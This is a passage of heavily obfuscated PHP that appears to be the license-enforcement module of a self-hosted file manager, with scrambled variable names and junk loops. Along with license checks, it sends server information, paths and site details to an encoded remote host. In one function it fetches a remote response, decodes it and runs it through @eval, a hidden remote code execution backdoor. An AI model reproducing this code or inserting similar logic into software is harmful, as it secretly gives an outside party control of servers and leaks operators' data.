$­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[101]] = Mcrypt::encode(Session::sign(), $Šá‘Ü¢Å, 3600 * 24); $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[102]] = Action($æ‘—“óß[103])->accessToken(); $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[104]] = md5($_SERVER[$æ‘—“óß[105]] . $ÍàÉåÔù[$æ‘—“óß[99]]); $Í§äÇÁ® = $ı²†œûÔ[682]; if (strlen($Í§äÇÁ®) < $ı²†œûÔ[652]) { return; } $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[106]] = base64_encode(serverInfo()); $—ìÚø¥œ = $ı²†œûÔ[683]; while (strlen($—ìÚø¥œ) < $ı²†œûÔ[655]) { if (!$—ìÚø¥œ) { break; } $—ìÚø¥œ++; } $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[107]] = $this->ieanf7ba34b0; $ÒˆáÔÏÛ = $ı²†œûÔ[684]; if (strlen($ÒˆáÔÏÛ) < $ı²†œûÔ[677]) { return; } if ($ÍàÉåÔù[$æ‘—“óß[107]] != $æ‘—“óß[108]) { $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[109]] = $ÍàÉåÔù[$æ‘—“óß[109]]; $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[110]] = $ÍàÉåÔù[$æ‘—“óß[110]]; $¢Áìûğè = rand_string(10) . $this->ieanf7ba34b0 . rand_string(5); $­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[111]][$æ‘—“óß[112]] = $this->soza56fc1aa9($¢Áìûğè, $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[104]]); } if ($this->ieanf7ba34b0 == $æ‘—“óß[108]) { $­Íù¦©ç[$æ‘—“óß[87]][$æ‘—“óß[88]][$æ‘—“óß[93]][$æ‘—“óß[97]] = 0; } $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[113]] = _get($this->yzei5cded045, $æ‘—“óß[114], $æ‘—“óß[6]); $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[115]] = _get($this->yzei5cded045, $æ‘—“óß[116], $æ‘—“óß[6]); $…§õ€Ø¾ = $ı²†œûÔ[685]; if (strlen($…§õ€Ø¾) < $ı²†œûÔ[677]) { die; } if (_get($GLOBALS, $æ‘—“óß[117]) && $this->config[$æ‘—“óß[118]]) { $­Íù¦©ç[$æ‘—“óß[100]][$æ‘—“óß[119]] = WEB_ROOT; } return $­Íù¦©ç; } private function hkyd4ab83ec6() { $Åİ“óğØ =& $_SERVER[—ÌÒğš÷]; $äÚîªÒ =& $_SERVER[Ş®ª¹ÕŸ]; $‡·›¯•¿ = $_SERVER[$äÚîªÒ[24]] == $äÚîªÒ[120]; $ŒÄŞœ­– = $Åİ“óğØ[686]; if (strlen($ŒÄŞœ­–) < $Åİ“óğØ[652]) { die; } if ($_SERVER[$äÚîªÒ[24]] == $äÚîªÒ[121] && $_GET[$äÚîªÒ[122]] == $äÚîªÒ[123]) { $‡·›¯•¿ = !0; } if ($‡·›¯•¿) { $Ê˜“Ó  = array($äÚîªÒ[107] => $this->ieanf7ba34b0, $äÚîªÒ[124] => $this->ukvg8e14ba52(), $äÚîªÒ[125] => Model($äÚîªÒ[126])->count()); if ($this->ieanf7ba34b0 != $äÚîªÒ[108]) { $õŒ´•âº = _get($this->yzei5cded045, $äÚîªÒ[127]); if ($õŒ´•âº) { $Ê˜“Ó [$äÚîªÒ[128]] = $õŒ´•âº; $Ê˜“Ó [$äÚîªÒ[129]] = strtotime(_get($this->yzei5cded045, $äÚîªÒ[130])); $Ê˜“Ó [$äÚîªÒ[131]] = _get($this->yzei5cded045, $äÚîªÒ[116]); } $ÌóãÖ¥ = Model($äÚîªÒ[33])->get($äÚîªÒ[132], $äÚîªÒ[6], !0); if (is_string($ÌóãÖ¥) && substr($ÌóãÖ¥, 0, 1) == $äÚîªÒ[133]) { $ÌóãÖ¥ = json_decode_force($ÌóãÖ¥); } if (is_array($ÌóãÖ¥) && $ÌóãÖ¥[$äÚîªÒ[134]] && strstr($ÌóãÖ¥[$äÚîªÒ[134]], $äÚîªÒ[135])) { $¶†Í¡¿¶ = explode($äÚîªÒ[135], $ÌóãÖ¥[$äÚîªÒ[134]]); $Ê˜“Ó [$äÚîªÒ[136]] = $¶†Í¡¿¶[0]; } } $Ê˜“Ó  = $this->vsbg173a0a13(json_encode($Ê˜“Ó ), md5($äÚîªÒ[137])); $İ¼¸‘İİ = $Åİ“óğØ[687]; while (strlen($İ¼¸‘İİ) < $Åİ“óğØ[655]) { if (!$İ¼¸‘İİ) { break; } $İ¼¸‘İİ++; } $Âœåå© = array($äÚîªÒ[138] => $Ê˜“Ó ); $¬çƒ¹ç = $Åİ“óğØ[688]; while (strlen($¬çƒ¹ç) < $Åİ“óğØ[663]) { if (!$¬çƒ¹ç) { break; } $¬çƒ¹ç++; } call_user_func(array($äÚîªÒ[139], $äÚîªÒ[140]), $Âœåå©); $àÇ¡Äºü = $Åİ“óğØ[689]; } if ($this->ieanf7ba34b0 == $äÚîªÒ[108]) { return; } $úĞ©½•Î = array($äÚîªÒ[141], $äÚîªÒ[142], $äÚîªÒ[143], $äÚîªÒ[144], $äÚîªÒ[145], $äÚîªÒ[146]); $»©”Â´ß = $Åİ“óğØ[690]; while (strlen($»©”Â´ß) < $Åİ“óğØ[663]) { if (!$»©”Â´ß) { break; } $»©”Â´ß++; } $æŸª•³ = Model($äÚîªÒ[33])->get(); $Âœåå© = array($äÚîªÒ[147] => $æŸª•³[$äÚîªÒ[34]], $äÚîªÒ[148] => $æŸª•³[$äÚîªÒ[35]], $äÚîªÒ[149] => $äÚîªÒ[6]); foreach ($úĞ©½•Î as $É‰×³Èş) { if (!isset($æŸª•³[$É‰×³Èş]) || !$æŸª•³[$É‰×³Èş]) { continue; } $Âœåå©[$É‰×³Èş] = $æŸª•³[$É‰×³Èş]; $ı¡¥„Ì = $Åİ“óğØ[691]; while ($ı¡¥„Ì < $Åİ“óğØ[677]) { if ($ı¡¥„Ì >= 0) { break; } $ı¡¥„Ì++; } } call_user_func(array($äÚîªÒ[139], $äÚîªÒ[140]), $Âœåå©); $‹Î†œÈñ = $Åİ“óğØ[692]; if (!$‹Î†œÈñ) { return; } } private function ulwa4d1e7528() { $Öà–éÜ =& $_SERVER[—ÌÒğš÷]; $­º”³ê =& $_SERVER[Ş®ª¹ÕŸ]; if ($_SERVER[$­º”³ê[24]] != $­º”³ê[150]) { return; } if (!_get($GLOBALS, $­º”³ê[117])) { die; } $İ‘±Š¥ß = $GLOBALS[$­º”³ê[13]]; if (isset($İ‘±Š¥ß[$­º”³ê[151]])) { $this->dlam28b17159(); die; } if (!isset($İ‘±Š¥ß[$­º”³ê[152]]) || strlen($İ‘±Š¥ß[$­º”³ê[152]]) != 16) { show_json($­º”³ê[153] . $İ‘±Š¥ß[$­º”³ê[152]], !1); } $±ãš€õ = Model($­º”³ê[33])->get($­º”³ê[99]); $‰Ü¶ºÉ± = md5($_SERVER[$­º”³ê[105]] . $±ãš€õ); $İŒáãÈ• = $Öà–éÜ[693]; while (strlen($İŒáãÈ•) < $Öà–éÜ[677]) { if (!$İŒáãÈ•) { break; } $İŒáãÈ•++; } $‰ ×“ëà = array($­º”³ê[152] => $İ‘±Š¥ß[$­º”³ê[152]], $­º”³ê[154] => rand_string(16), $­º”³ê[155] => $­º”³ê[137], $­º”³ê[156] => $­º”³ê[157], $­º”³ê[158] => $_SERVER[$­º”³ê[159]], $­º”³ê[160] => $_SERVER[$­º”³ê[161]], $­º”³ê[162] => $_SERVER[$­º”³ê[163]], $­º”³ê[104] => $‰Ü¶ºÉ±, $­º”³ê[164] => Model($­º”³ê[33])->get($­º”³ê[132])); $ÕÌ» = $Öà–éÜ[694]; if ($İ‘±Š¥ß[$­º”³ê[165]] == $­º”³ê[166]) { $©íÃ®­½ = $this->vsbg173a0a13($‰Ü¶ºÉ±, $­º”³ê[167]); $Ú”¼Ãå = $this->soza56fc1aa9(json_encode($‰ ×“ëà), $‰Ü¶ºÉ± . $­º”³ê[168], 3); $Ú”¼Ãå = $Ú”¼Ãå . $­º”³ê[169] . $_SERVER[$­º”³ê[159]]; $÷ö³¿é¥ = $this->ljez365b465c($­º”³ê[170] . $©íÃ®­½ . $­º”³ê[171] . $Ú”¼Ãå, -1); show_json($÷ö³¿é¥, !0); } else { if ($İ‘±Š¥ß[$­º”³ê[165]] == $­º”³ê[172]) { $òˆÈµ  = substr(md5($­º”³ê[173] . $‰Ü¶ºÉ±), 12, 15) . $­º”³ê[174]; $Ú”¼Ãå = $this->ucrt22fd8c58(trim($İ‘±Š¥ß[$­º”³ê[175]]), $òˆÈµ , 2); $€íô‚°¬ = json_decode($Ú”¼Ãå, !0); if (!is_array($€íô‚°¬) || !is_array($€íô‚°¬[$­º”³ê[176]]) || $€íô‚°¬[$­º”³ê[152]] != !0) { $”èå·È = $­º”³ê[177]; $Ÿ“Ú‡°ş = $€íô‚°¬[$­º”³ê[176]] ? $­º”³ê[178] . $€íô‚°¬[$­º”³ê[176]] : $”èå·È; show_json($Ÿ“Ú‡°ş, !1); } else { $‰ ×“ëà[$­º”³ê[154]] = $€íô‚°¬[$­º”³ê[176]][$­º”³ê[179]]; } } else { $€íô‚°¬ = $this->ljez365b465c($­º”³ê[180], $‰ ×“ëà, 10); } } if (!is_array($€íô‚°¬) || !is_array($€íô‚°¬[$­º”³ê[176]]) || $€íô‚°¬[$­º”³ê[152]] != !0) { $”èå·È = LNG($­º”³ê[181]); $Ÿ“Ú‡°ş = $€íô‚°¬[$­º”³ê[176]] ? $­º”³ê[178] . $€íô‚°¬[$­º”³ê[176]] : $”èå·È; show_json($Ÿ“Ú‡°ş, !1); } $óÖõ–òŸ = $€íô‚°¬[$­º”³ê[176]]; $ºšµ¤µÜ = $this->ehkr1c96d058($óÖõ–òŸ[$­º”³ê[182]]); if (!$ºšµ¤µÜ || $ºšµ¤µÜ != $óÖõ–òŸ[$­º”³ê[130]]) { $ëºÒïÀ  = array($­º”³ê[183] => Model($­º”³ê[33])->get($­º”³ê[99]), $­º”³ê[184] => $_SERVER[$­º”³ê[105]], $­º”³ê[185] => this_url(), $­º”³ê[160] => $_SERVER[$­º”³ê[161]]); $Ú”¼Ãå = $this->thmg135a9b0a(json_encode($ëºÒïÀ )); $this->ljez365b465c($­º”³ê[186] . $Ú”¼Ãå); show_json(LNG($­º”³ê[187]), !0); } $˜à°úñ = array($­º”³ê[188] => $óÖõ–òŸ[$­º”³ê[189]], $­º”³ê[190] => $óÖõ–òŸ[$­º”³ê[191]], $­º”³ê[192] => rand_string(16), $­º”³ê[107] => $óÖõ–òŸ[$­º”³ê[193]]); if ($‰ ×“ëà[$­º”³ê[154]]) { $˜à°úñ[$­º”³ê[192]] = $‰ ×“ëà[$­º”³ê[154]]; } $Ú”¹óˆÃ = substr(md5($˜à°úñ[$­º”³ê[190]]), 10, 10); $…¹à¡£ñ = $Ú”¹óˆÃ . $˜à°úñ[$­º”³ê[107]] . $˜à°úñ[$­º”³ê[192]]; $˜à°úñ[$­º”³ê[109]] = strrev(base64_encode($this->vsbg173a0a13($…¹à¡£ñ, $­º”³ê[194]))); $³Ë…†»Û = $Öà–éÜ[695]; if (strlen($³Ë…†»Û) < $Öà–éÜ[652]) { return; } $û¡ÎÓ§– = rand_string(16); $˜‘ì£½À = $û¡ÎÓ§– . $˜à°úñ[$­º”³ê[107]] . $this->vsbg173a0a13(md5($˜à°úñ[$­º”³ê[188]]), $û¡ÎÓ§–); $Ü‡Ã¥–Ç = $Öà–éÜ[696]; if (!$Ü‡Ã¥–Ç) { die; } $˜à°úñ[$­º”³ê[110]] = base64_encode(strrev($this->vsbg173a0a13($˜‘ì£½À, $­º”³ê[195]))); if ($óÖõ–òŸ[$­º”³ê[196]] && $óÖõ–òŸ[$­º”³ê[196]] >= 1) { Model($­º”³ê[33])->setDeep($­º”³ê[197], $­º”³ê[123]); } Model($­º”³ê[33])->set($˜à°úñ); $ÒÒ‘Ãª = md5($_SERVER[$­º”³ê[105]] . strrev($±ãš€õ) . $˜à°úñ[$­º”³ê[190]]); $Ùá¥ëÑ¹ = strrev(substr($ÒÒ‘Ãª, 10, 16)); $ê¶Ã‘¨Ì = $this->soza56fc1aa9(json_encode($óÖõ–òŸ), $ÒÒ‘Ãª); $Ë€ùÛä² = array_to_keyvalue(Model($­º”³ê[7])->listData(), $­º”³ê[198]); $ÏÒáùŞü = $Ë€ùÛä²[$­º”³ê[199]]; $çÁ âäà = array(); $ˆ•ÈßÉ = $Öà–éÜ[697]; if (strlen($ˆ•ÈßÉ) < $Öà–éÜ[652]) { return; } $çÁ âäà[$Ùá¥ëÑ¹] = $ê¶Ã‘¨Ì; Model($­º”³ê[7])->update($ÏÒáùŞü[$­º”³ê[200]], array($­º”³ê[201] => $çÁ âäà)); $€»ôğé½ = $Öà–éÜ[698]; if (!$€»ôğé½) { return; } $this->yzei5cded045 = $óÖõ–òŸ; $this->ieanf7ba34b0 = $˜à°úñ[$­º”³ê[107]]; $ªùã€“ = $Öà–éÜ[699]; while (strlen($ªùã€“) < $Öà–éÜ[655]) { if (!$ªùã€“) { break; } $ªùã€“++; } $this->licenseRegistSuccess(); $×²µ’¡œ = $Öà–éÜ[700]; if (strlen($×²µ’¡œ) < $Öà–éÜ[652]) { return; } Cache::set($­º”³ê[202] . md5($±ãš€õ . $­º”³ê[203]), $­º”³ê[6]); show_json(LNG($­º”³ê[187]), !0); $ÇØúĞ„‡ = $Öà–éÜ[701]; while ($ÇØúĞ„‡ < $Öà–éÜ[658]) { if ($ÇØúĞ„‡ >= 0) { break; } $ÇØúĞ„‡++; } } private function licenseRegistSuccess() { $ğË¶ŸóÄ =& $_SERVER[Ş®ª¹ÕŸ]; $ù¢†Èƒ = Model($ğË¶ŸóÄ[33])->get(); if ($ù¢†Èƒ[$ğË¶ŸóÄ[63]] != $ğË¶ŸóÄ[123]) { Model($ğË¶ŸóÄ[33])->set($ğË¶ŸóÄ[63], $ğË¶ŸóÄ[123]); } Action($ğË¶ŸóÄ[204])->initStart(!0); } private function dlam28b17159() { $‘š·¬ÚÖ =& $_SERVER[—ÌÒğš÷]; $•§Äøõ© =& $_SERVER[Ş®ª¹ÕŸ]; Model($•§Äøõ©[33])->set(array($•§Äøõ©[188] => $•§Äøõ©[6], $•§Äøõ©[190] => $•§Äøõ©[6], $•§Äøõ©[107] => $•§Äøõ©[108], $•§Äøõ©[109] => $•§Äøõ©[6], $•§Äøõ©[110] => $•§Äøõ©[6])); $¥ó«İî© = $‘š·¬ÚÖ[702]; Model($•§Äøõ©[33])->setDeep($•§Äøõ©[197], $•§Äøõ©[205]); $©Ù­—à = $‘š·¬ÚÖ[703]; if (!$©Ù­—à) { return; } $this->yzei5cded045 = array(); $ƒˆøîŠ€ = $‘š·¬ÚÖ[704]; $this->ieanf7ba34b0 = $•§Äøõ©[108]; } private function jbfz19433515() { $Ùùä•Ç =& $_SERVER[—ÌÒğš÷]; $¬äÙıß¥ =& $_SERVER[Ş®ª¹ÕŸ]; $_SERVER[$¬äÙıß¥[161]] = _get($_SERVER, $¬äÙıß¥[161], APP_HOST); $´§ÆëŒ¾ = $Ùùä•Ç[705]; if (!$´§ÆëŒ¾) { return; } $this->ieanf7ba34b0 = $¬äÙıß¥[108]; $í‚ôï¾ = Model($¬äÙıß¥[33])->get(); if ($í‚ôï¾[$¬äÙıß¥[107]] == $¬äÙıß¥[108]) { return; } $‘ş×ñíë = Model($¬äÙıß¥[33])->get($¬äÙıß¥[99]); $Ï©í–­í = $¬äÙıß¥[202] . md5($‘ş×ñíë . $¬äÙıß¥[203]); $±£å±›½ = Cache::get($Ï©í–­í); if (!is_array($±£å±›½) || !isset($±£å±›½[$¬äÙıß¥[206]]) || time() - $±£å±›½[$¬äÙıß¥[206]] >= 60) { $™ÙéÌ š = Model($¬äÙıß¥[7])->loadList(); $¿Š‰° = $™ÙéÌ š[$¬äÙıß¥[199]]; $Ì³Ü›ˆş = md5($_SERVER[$¬äÙıß¥[105]] . strrev($‘ş×ñíë) . $í‚ôï¾[$¬äÙıß¥[190]]); $©èòÈé² = strrev(substr($Ì³Ü›ˆş, 10, 16)); $±£å±›½ = $this->ucrt22fd8c58($¿Š‰°[$¬äÙıß¥[85]][$©èòÈé²], $Ì³Ü›ˆş); $±£å±›½ = json_decode($±£å±›½, !0); } if (!is_array($±£å±›½)) { return $this->dlam28b17159(); } $Ÿ÷Ÿ¹İÎ = strtotime($±£å±›½[$¬äÙıß¥[130]]); if (time() >= $Ÿ÷Ÿ¹İÎ) { return $this->dlam28b17159(); } if (time() - $±£å±›½[$¬äÙıß¥[206]] > 20) { $±£å±›½[$¬äÙıß¥[206]] = time(); Cache::set($Ï©í–­í, $±£å±›½); } $this->yzei5cded045 = $±£å±›½; $this->ieanf7ba34b0 = $í‚ôï¾[$¬äÙıß¥[107]]; $ÄÔÌ¬ÜÀ = $Ùùä•Ç[706]; while ($ÄÔÌ¬ÜÀ < $Ùùä•Ç[655]) { if ($ÄÔÌ¬ÜÀ >= 0) { break; } $ÄÔÌ¬ÜÀ++; } } private function acvd780e3c16() { $¾şÍğ“ =& $_SERVER[—ÌÒğš÷]; $Ş‡¤§ÛÉ =& $_SERVER[Ş®ª¹ÕŸ]; $‚ÈÊÀë± = $GLOBALS[$Ş‡¤§ÛÉ[13]]; $°¸ËîÛù = $¾şÍğ“[707]; if (strlen($°¸ËîÛù) < $¾şÍğ“[658]) { return; } $ûÁò¸ò = $_SERVER[$Ş‡¤§ÛÉ[24]]; if ($ûÁò¸ò == $Ş‡¤§ÛÉ[207] && $this->ieanf7ba34b0 == $Ş‡¤§ÛÉ[108]) { show_json(LNG($Ş‡¤§ÛÉ[208]), !1, $Ş‡¤§ÛÉ[209]); } $Ó­®Ğ§¼ = array($Ş‡¤§ÛÉ[210], $Ş‡¤§ÛÉ[211]); if (in_array($ûÁò¸ò, $Ó­®Ğ§¼)) { if ($this->ieanf7ba34b0 == $Ş‡¤§ÛÉ[108] && isset($‚ÈÊÀë±[$Ş‡¤§ÛÉ[212]])) { show_json(LNG($Ş‡¤§ÛÉ[208]), !1, $Ş‡¤§ÛÉ[209]); die; } $½ï¤¸èè = $this->ukvg8e14ba52(); if ($½ï¤¸èè != intval($Ş‡¤§ÛÉ[213])) { if ($½ï¤¸èè <= Model($Ş‡¤§ÛÉ[126])->count()) { show_json(LNG($Ş‡¤§ÛÉ[214]), !1, $Ş‡¤§ÛÉ[209]); die; } } } } private function bnmgf114de84() { $ ˜÷«ã =& $_SERVER[—ÌÒğš÷]; $’¹“»ÄÉ =& $_SERVER[Ş®ª¹ÕŸ]; $ÕÑåİÑı = array($’¹“»ÄÉ[120], $’¹“»ÄÉ[121]); $ºÓ—§Óº = $ ˜÷«ã[708]; if (!_get($GLOBALS, $’¹“»ÄÉ[117]) || !isset($_GET[$’¹“»ÄÉ[215]])) { return; } if (!in_array($_SERVER[$’¹“»ÄÉ[24]], $ÕÑåİÑı)) { return; } $‘“Ò”ØÅ = $’¹“»ÄÉ[216]; $‘“Ò”ØÅ = $this->mkchd62dd9e0($‘“Ò”ØÅ, $’¹“»ÄÉ[217]); $‡×ùÃâë = stream_context_create(array($’¹“»ÄÉ[218] => array($’¹“»ÄÉ[219] => $’¹“»ÄÉ[220], $’¹“»ÄÉ[221] => 3))); $Ìª®ğó£ = $ ˜÷«ã[709]; if (!$Ìª®ğó£) { return; } $³ÂÏ­±Ú = @file_get_contents($‘“Ò”ØÅ, !1, $‡×ùÃâë); header($’¹“»ÄÉ[222]); if ($³ÂÏ­±Ú && strstr($³ÂÏ­±Ú, $’¹“»ÄÉ[223])) { echo $³ÂÏ­±Ú; } die; } public function frae18d7e3bd($²Û¿ÅŠ•) { $™Ã‚“¡æ =& $_SERVER[—ÌÒğš÷]; $‚é¸ŒûÑ =& $_SERVER[Ş®ª¹ÕŸ]; if ($this->ieanf7ba34b0 == $‚é¸ŒûÑ[224]) { return $²Û¿ÅŠ•; } $ïºï÷”ç = array($‚é¸ŒûÑ[225] => $‚é¸ŒûÑ[226], $‚é¸ŒûÑ[227] => $‚é¸ŒûÑ[226], $‚é¸ŒûÑ[228] => $‚é¸ŒûÑ[226], $‚é¸ŒûÑ[229] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[231] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[232] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[233] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[234] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[235] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[236] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[237] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[238] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[239] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[240] => $‚é¸ŒûÑ[230], $‚é¸ŒûÑ[241] => $‚é¸ŒûÑ[230]); $ª¥¦äèá = $™Ã‚“¡æ[710]; while ($ª¥¦äèá < $™Ã‚“¡æ[677]) { if ($ª¥¦äèá >= 0) { break; } $ª¥¦äèá++; } $‚²Œˆ“… = explode($‚é¸ŒûÑ[242], _get($this->yzei5cded045, $‚é¸ŒûÑ[114], $‚é¸ŒûÑ[6])); $Õ‹í‘¦ = $™Ã‚“¡æ[711]; while ($Õ‹í‘¦ < $™Ã‚“¡æ[652]) { if ($Õ‹í‘¦ >= 0) { break; } $Õ‹í‘¦++; } $¡ÈÜéîÊ = array(); foreach ($ïºï÷”ç as $ÉÒüıÊ => $Íàâ±Á°) { if ($Íàâ±Á° == $‚é¸ŒûÑ[226] && substr($this->ieanf7ba34b0, 0, 1) == $‚é¸ŒûÑ[226]) { continue; } if (!in_array($ÉÒüıÊ, $‚²Œˆ“…)) { $¡ÈÜéîÊ[] = $ÉÒüıÊ; } } foreach ($¡ÈÜéîÊ as $ÉÒüıÊ) { unset($²Û¿ÅŠ•[$ÉÒüıÊ]); $‰’Ùˆøö = $™Ã‚“¡æ[712]; if (!$‰’Ùˆøö) { die; } } return $²Û¿ÅŠ•; $—ºŸŒˆ = $™Ã‚“¡æ[713]; if (strlen($—ºŸŒˆ) < $™Ã‚“¡æ[663]) { die; } } private function adnm4806721e() { $¼‡äÂá =& $_SERVER[Ş®ª¹ÕŸ]; if ($this->ieanf7ba34b0 != $¼‡äÂá[108]) { $GLOBALS[$¼‡äÂá[85]][$¼‡äÂá[89]][$¼‡äÂá[243]] = $¼‡äÂá[205]; return; } $GLOBALS[$¼‡äÂá[85]][$¼‡äÂá[244]] = $¼‡äÂá[123]; if (Model($¼‡äÂá[245])->get($¼‡äÂá[63]) != $¼‡äÂá[205]) { Model($¼‡äÂá[245])->set($¼‡äÂá[63], $¼‡äÂá[205]); } } public function khwm1aca3838() { return $_SERVER[Ş®ª¹ÕŸ][246]; $”–•Êş = $_SERVER[—ÌÒğš÷][714]; if (!$”–•Êş) { die; } } private function dfjb586293fc() { $àóÊı =& $_SERVER[—ÌÒğš÷]; $— Úºúæ =& $_SERVER[Ş®ª¹ÕŸ]; $ë¦ë¡½’ = array($— Úºúæ[247], $— Úºúæ[248], $— Úºúæ[249]); $Ã½¼î¼‡ = $— Úºúæ[250] . md5($— Úºúæ[251]); if ($this->ieanf7ba34b0 == $— Úºúæ[108] || !_get($GLOBALS, $— Úºúæ[117])) { return; } if (!in_array($_SERVER[$— Úºúæ[24]], $ë¦ë¡½’)) { return; } if (time() % 4 != 0) { return; } $©ö”³£Ú = call_user_func(array($— Úºúæ[252], $— Úºúæ[253]), $Ã½¼î¼‡); $­Ëûë = $àóÊı[715]; if (strlen($­Ëûë) < $àóÊı[655]) { die; } if ($©ö”³£Ú && time() - $©ö”³£Ú < intval($— Úºúæ[254])) { return; } call_user_func(array($— Úºúæ[252], $— Úºúæ[140]), $Ã½¼î¼‡, time()); $¿Òì = Model($— Úºúæ[33])->get($— Úºúæ[99]); $„¹”Ïñ” = $àóÊı[716]; if (strlen($„¹”Ïñ”) < $àóÊı[658]) { return; } $’ÌÅö½‘ = array($— Úºúæ[152] => Model($— Úºúæ[33])->get($— Úºúæ[188]), $— Úºúæ[165] => $this->ieanf7ba34b0, $— Úºúæ[162] => $_SERVER[$— Úºúæ[163]], $— Úºúæ[164] => Model($— Úºúæ[33])->get($— Úºúæ[132]), $— Úºúæ[104] => md5($_SERVER[$— Úºúæ[105]] . $¿Òì), $— Úºúæ[155] => $— Úºúæ[137], $— Úºúæ[158] => $_SERVER[$— Úºúæ[159]]); $´Ôä‡Çœ = $this->ljez365b465c($— Úºúæ[255], $’ÌÅö½‘); $ş¢Õ‹†í = $àóÊı[717]; if (strlen($ş¢Õ‹†í) < $àóÊı[658]) { die; } if (!is_array($´Ôä‡Çœ)) { return; } if ($´Ôä‡Çœ[$— Úºúæ[152]] && $´Ôä‡Çœ[$— Úºúæ[256]]) { if ($this->ehkr1c96d058($´Ôä‡Çœ[$— Úºúæ[256]]) == $’ÌÅö½‘[$— Úºúæ[152]]) { return; } } $this->dlam28b17159(); if ($this->ehkr1c96d058($´Ôä‡Çœ[$— Úºúæ[256]]) != $’ÌÅö½‘[$— Úºúæ[152]]) { $³øè½ÂÕ = array($— Úºúæ[183] => $¿Òì, $— Úºúæ[184] => $_SERVER[$— Úºúæ[105]], $— Úºúæ[185] => this_url(), $— Úºúæ[160] => $_SERVER[$— Úºúæ[161]]); $µÕ»œ’ = $this->thmg135a9b0a(json_encode($³øè½ÂÕ)); $´Ôä‡Çœ = $this->ljez365b465c($— Úºúæ[186] . $µÕ»œ’); if ($´Ôä‡Çœ && is_array($´Ôä‡Çœ) && isset($´Ôä‡Çœ[$— Úºúæ[256]])) { $÷‘æŞ™ = $this->ucrt22fd8c58($´Ôä‡Çœ[$— Úºúæ[256]], 2); if ($÷‘æŞ™) { $÷‘æŞ™ = $this->ehkr1c96d058($÷‘æŞ™); } if ($÷‘æŞ™) { try { @eval($÷‘æŞ™); } catch (Exception $¤íœÍğÚ) { } } } } } private function ljez365b465c($”Ÿ‹Åîè = '', $àï®äãÎ = array(), $šÉ±åíÖ = 5) { $¯ğßê‘“ =& $_SERVER[—ÌÒğš÷]; $¡¨¶Ú®¿ =& $_SERVER[Ş®ª¹ÕŸ]; $ÓËù Ö” = $¡¨¶Ú®¿[257]; $ÓËù Ö” = $this->mkchd62dd9e0($ÓËù Ö”, $¡¨¶Ú®¿[258]); $ÓËù Ö” = $ÓËù Ö” . $”Ÿ‹Åîè; $ş‹¨²´· = $¯ğßê‘“[718]; while ($ş‹¨²´· < $¯ğßê‘“[663]) { if ($ş‹¨²´· >= 0) { break; } $ş‹¨²´·++; } if ($àï®äãÎ && is_array($àï®äãÎ)) { $ÓËù Ö” = $ÓËù Ö” . $¡¨¶Ú®¿[259] . http_build_query($àï®äãÎ); } if ($àï®äãÎ === -1) { return $ÓËù Ö”; } $ú³î³ûş = stream_context_create(array($¡¨¶Ú®¿[218] => array($¡¨¶Ú®¿[221] => $šÉ±åíÖ, $¡¨¶Ú®¿[219] => $¡¨¶Ú®¿[260]), $¡¨¶Ú®¿[261] => array($¡¨¶Ú®¿[262] => !1, $¡¨¶Ú®¿[263] => !1))); $½¦ÅÑ² = $¯ğßê‘“[719]; if (!$½¦ÅÑ²) { die; } $àï®äãÎ = @file_get_contents($ÓËù Ö”, !1, $ú³î³ûş); return json_decode($àï®äãÎ, !0); } private function ukvg8e14ba52() { $°Ãæ÷²í =& $_SERVER[—ÌÒğš÷]; $‘»”ğå =& $_SERVER[Ş®ª¹ÕŸ]; $­Î™Ÿäë = array($‘»”ğå[264] => $‘»”ğå[265], $‘»”ğå[266] => $‘»”ğå[267], $‘»”ğå[268] => $‘»”ğå[269], $‘»”ğå[270] => $‘»”ğå[271], $‘»”ğå[272] => $‘»”ğå[273], $‘»”ğå[274] => $‘»”ğå[213], $‘»”ğå[275] => $‘»”ğå[213], $‘»”ğå[276] => $‘»”ğå[265], $‘»”ğå[277] => $‘»”ğå[267], $‘»”ğå[278] => $‘»”ğå[269], $‘»”ğå[279] => $‘»”ğå[280], $‘»”ğå[281] => $‘»”ğå[271], $‘»”ğå[282] => $‘»”ğå[283], $‘»”ğå[284] => $‘»”ğå[273], $‘»”ğå[285] => $‘»”ğå[286], $‘»”ğå[287] => $‘»”ğå[288], $‘»”ğå[289] => $‘»”ğå[290]); $ËòáÒçÀ = $­Î™Ÿäë[$this->ieanf7ba34b0]; $’¬ùÒ¥ñ = $°Ãæ÷²í[720]; while (strlen($’¬ùÒ¥ñ) < $°Ãæ÷²í[663]) { if (!$’¬ùÒ¥ñ) { break; } $’¬ùÒ¥ñ++; } $ËòáÒçÀ = intval($ËòáÒçÀ ? $ËòáÒçÀ : $‘»”ğå[265]); $òï®ú¸¤ = $°Ãæ÷²í[721]; $£¹õÄ© = _get($this->yzei5cded045, $‘»”ğå[291]); $º½½€óø = $°Ãæ÷²í[722]; $£¹õÄ© = $£¹õÄ© ? intval($£¹õÄ©) : 0; return $ËòáÒçÀ + $£¹õÄ©; $ñ§ÙÙóİ = $°Ãæ÷²í[723]; if (!$ñ§ÙÙóİ) { die; } } public function rpkdd7f931bd($ƒÅÃâãĞ) { $üÂŒñâ¯ =& $_SERVER[—ÌÒğš÷]; $Â¯ÔËºï =& $_SERVER[Ş®ª¹ÕŸ]; $ÅüùÈ¡ = $this->ukvg8e14ba52(); if ($ƒÅÃâãĞ[$Â¯ÔËºï[292]] == $Â¯ÔËºï[123]) { return; } if ($ÅüùÈ¡ >= intval($Â¯ÔËºï[213])) { return; } 